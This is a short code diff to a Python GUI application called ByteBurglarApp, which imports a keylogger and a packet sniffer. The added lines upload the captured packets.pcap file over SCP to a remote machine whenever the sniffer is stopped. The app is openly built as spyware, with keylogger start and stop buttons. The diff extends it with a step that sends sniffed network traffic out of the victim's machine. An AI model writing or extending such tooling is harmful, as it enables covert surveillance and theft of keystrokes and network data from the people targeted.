@@ -2,6 +2,7 @@ import customtkinter as ctk
 import threading
 from Keylogger.client import KeyloggerThread
 from PythonSecurity.packet_sniffer import PacketSniffer
+from PythonSecurity.scp_transfer import SCPUploader
 
 BUTTON_START_KEYLOGGER_TEXT = 'Start keylogger'
 BUTTON_STOP_KEYLOGGER_TEXT = 'Stop keylogger'
@@ -63,6 +64,8 @@ class ByteBurglarApp:
     def deactivate_packet_sniffer(self):
         print('Deactivating packet sniffer')
         packet_sniffer.stop()
+        scp_uploader = SCPUploader()
+        scp_uploader.upload_file('packets.pcap')
 
     def update_textbox(self, data):
         self.text.configure(state='normal')  # Enable the textbox
